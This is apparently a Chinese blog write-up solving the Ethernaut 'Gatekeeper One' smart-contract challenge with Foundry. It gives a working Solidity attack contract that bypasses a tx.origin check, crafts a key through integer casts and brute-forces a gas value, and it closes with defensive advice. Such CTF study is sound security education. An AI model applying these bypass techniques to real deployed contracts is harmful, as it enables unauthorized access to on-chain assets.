---
title: 'Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换'
date: 2025-01-25 16:10:00
updated: 2025-01-25 16:10:00
categories:
  - Ethernaut 系列
  - 进阶攻击篇 (11-20)
tags:
  - Ethernaut
  - Foundry
  - Gas Manipulation
  - Type Casting
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "深入学习EVM中的Gas计算、类型转换和tx.origin的巧妙运用，掌握Gatekeeper One关卡的破解技巧。理解modifier的绕过方法和gasleft()的特性。"
---

# 🎯 Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换

> **关卡链接**: [Ethernaut Level 13 - Gatekeeper One](https://ethernaut.openzeppelin.com/level/13)  
> **攻击类型**: Gas计算 / 类型转换  
> **难度**: ⭐⭐⭐⭐☆

## 📋 挑战目标

通过三个 `modifier` 的检测，成功调用 `enter` 函数，成为 `entrant`。

![Gatekeeper One Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg)

## 🔍 漏洞分析

要通过此关卡，我们需要调用 `enter(bytes8 _gateKey)` 函数，但必须绕过它的三个 `modifier`。让我们逐一分析。

### Modifier 1: `gateOne`

```solidity
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

这个 `modifier` 要求 `msg.sender` 不等于 `tx.origin`。这是一种常见的检查，用于防止直接从外部账户（EOA）调用。为了绕过它，我们必须通过一个中间合约来调用 `enter` 函数。这样，`tx.origin` 将是我们的EOA地址，而 `msg.sender` 将是攻击合约的地址。

### Modifier 2: `gateTwo`

```solidity
modifier gateTwo() {
  require(gasleft() % 8191 == 0);
  _;
}
```

这个 `modifier` 要求在执行到这里时，剩余的 `gas` 必须是 `8191` 的倍数。这是一个棘手的约束，因为 `gas` 的消耗会因操作码、Solidity版本和优化器设置而异。

最直接的方法是进行暴力破解：通过一个循环，在调用 `enter` 函数时尝试不同的 `gas` 值，直到找到一个满足 `gasleft() % 8191 == 0` 的值。

### Modifier 3: `gateThree`

```solidity
modifier gateThree(bytes8 _gateKey) {
  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
  require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
  _;
}
```

这个 `modifier` 对我们传入的 `_gateKey` (一个 `bytes8` 类型的值) 进行了三项检查：

1.  `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
    *   `uint64(_gateKey)` 将 `bytes8` 转换为 `uint64`。
    *   `uint32(...)` 会截断，只保留低32位。
    *   `uint16(...)` 会截断，只保留低16位。
    *   为了让两者相等，`_gateKey` 的第17位到第32位必须全为0。例如，`0x????????0000????`。

2.  `uint32(uint64(_gateKey)) != uint64(_gateKey)`
    *   这要求 `_gateKey` 的高32位不全为0。

3.  `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`
    *   `uint16(uint160(tx.origin))` 获取 `tx.origin` 地址的最低16位。
    *   这要求 `_gateKey` 的低32位（经过第一次检查后，其实就是低16位）必须等于 `tx.origin` 的低16位。

综合这三个条件，我们可以构造出 `_gateKey`：
-   将 `tx.origin` (即我们的EOA地址) 的低16位作为 `_gateKey` 的低16位。
-   确保 `_gateKey` 的17-32位为0。
-   在 `_gateKey` 的高32位中设置至少一个非零位。

## 💻 Foundry 实现

### 攻击合约代码

这是我们的Foundry测试合约，它将部署攻击合约并调用 `enter` 函数。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/13_GatekeeperOne.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);
        instance = new GatekeeperOne();
        attacker = new Attack(address(instance));
    }

    function testattacker() public {
        vm.startPrank(player1, player1);
        // 使用试错法找到合适的gas值 (例如 268)
        attacker.attack(268);
        assertEq(instance.entrant(), player1);
        vm.stopPrank();
    }
}

contract Attack is Test {
    GatekeeperOne instance;

    constructor(address fb) {
        instance = GatekeeperOne(fb);
    }

    // 构造 gateKey 并使用指定的 gas 调用 enter 函数
    function attack(uint256 gas) public {
        // 构造满足 gateThree 的 key
        uint16 origin_suffix = uint16(uint160(msg.sender));
        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;

        // 使用计算好的 gas 调用目标函数
        instance.enter{gas: 8191 * 10 + gas}(gateKey);
    }

    // 用于暴力破解 gas 值的函数
    function findGas() public {
        uint16 origin_suffix = uint16(uint160(msg.sender));
        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;
        
        for (uint256 i = 0; i < 8191; i++) {
            try instance.enter{gas: 8191 * 10 + i}(gateKey) {
                console.log("Found gas:", i); // 实验得出 i = 268
                return;
            } catch {}
        }
        revert("No gas match found!");
    }
}
```

### 关键攻击步骤

1.  **创建攻击合约**: 绕过 `gateOne` (`msg.sender != tx.origin`)。
2.  **构造 `_gateKey`**:
    *   获取 `tx.origin` 的低16位。
    *   将其构造成一个 `bytes8` 值，满足 `gateThree` 的所有 `require` 条件。
3.  **暴力破解 `gas`**:
    *   编写一个循环，尝试不同的 `gas` 值来调用 `enter` 函数。
    *   在 `Foundry` 测试中，我们可以通过 `try/catch` 捕获失败的调用，直到找到一个成功的 `gas` 值（例如，`gas` 偏移量为 `268`）。
4.  **发起攻击**: 使用找到的 `gas` 值和构造的 `_gateKey` 从攻击合约中调用 `enter` 函数。

## 🛡️ 防御措施

1.  **避免复杂的 `gas` 检查**: `gasleft()` 的值是不可预测的，并且会随着EVM的更新而改变。不应将其用于关键的访问控制逻辑。
2.  **简化类型转换逻辑**: 过于复杂的类型转换和位操作会使代码难以理解，并可能引入意想不到的漏洞。应保持逻辑清晰、直接。
3.  **使用更安全的认证模式**: 不要依赖 `tx.origin` 或 `gas` 技巧。可以考虑使用数字签名、Merkle树或预言机等更强大的验证机制。

## 🔧 相关工具和技术

-   **Foundry `try/catch`**: 用于在测试中捕获和处理预期的 `revert`，非常适合暴力破解 `gas` 等场景。
-   **位操作 (`|`, `&`)**: 在构造 `_gateKey` 时用于精确控制字节内容。
-   **类型转换**: 深入理解Solidity中不同整数类型（`uint16`, `uint32`, `uint64`）和字节类型（`bytes8`）之间的转换规则至关重要。

## 🎯 总结

**核心概念**:
-   `tx.origin` vs `msg.sender` 的区别是许多合约攻击的基础。
-   `gasleft()` 的值是动态的，依赖它进行验证是脆弱的。
-   Solidity中的类型转换遵循严格的规则，不正确的转换或截断是常见的漏洞来源。

**攻击向量**:
-   通过中间合约绕过 `tx.origin` 检查。
-   通过暴力破解找到满足 `gasleft()` 模运算的 `gas` 值。
-   通过逆向工程类型转换和位操作的 `require` 条件来构造一个有效的输入。

**防御策略**:
-   不要将 `gas` 消耗作为安全机制。
-   保持验证逻辑的简单和直接。
-   使用经过验证的、更强大的身份验证模式。

## 📚 参考资料

-   [Solidity 类型转换](https://docs.soliditylang.org/en/latest/types.html#conversions)
-   [tx.origin vs msg.sender](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)